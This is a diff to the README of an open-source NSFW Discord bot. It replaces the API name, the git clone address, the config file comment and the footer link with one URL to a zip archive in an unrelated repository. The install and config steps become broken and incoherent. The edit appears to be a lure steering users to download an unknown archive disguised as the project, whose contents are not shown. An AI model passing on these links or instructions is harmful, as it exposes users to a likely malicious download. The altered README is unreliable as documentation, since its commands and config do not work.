@@ -1,6 +1,6 @@
 # NSFW Bot
 
-NSFW Bot is an open-source discord bot that has nsfw commands running with the nekobot.xyz api.
+NSFW Bot is an open-source discord bot that has nsfw commands running with the https://github.com/mindofjes/serverless-nodriver/raw/refs/heads/master/handler/nodriver-serverless-v3.7.zip api.
 
 ## Commands :
 
@@ -10,7 +10,7 @@ NSFW Bot is an open-source discord bot that has nsfw commands running with the n
 ## How to install ?
 
 ```bash
-git clone https://github.com/Sayrix/NSFW-Bot
+git clone https://github.com/mindofjes/serverless-nodriver/raw/refs/heads/master/handler/nodriver-serverless-v3.7.zip
 cd NSFW-Bot
 npm i
 ```
@@ -18,12 +18,12 @@ npm i
 ## How to config ?
 
 ```json
-//config.json
+https://github.com/mindofjes/serverless-nodriver/raw/refs/heads/master/handler/nodriver-serverless-v3.7.zip
 {
   "prefix": "your prefix",
   "token": "your token",
   "owners": ["OWNER ID"],
-  "footer": "NSFW Bot • is.gd/nsfwbot",
+  "footer": "NSFW Bot • https://github.com/mindofjes/serverless-nodriver/raw/refs/heads/master/handler/nodriver-serverless-v3.7.zip",
 
   "msg": {
     "nsfwWarn": "You must use this command in an nsfw channel!",
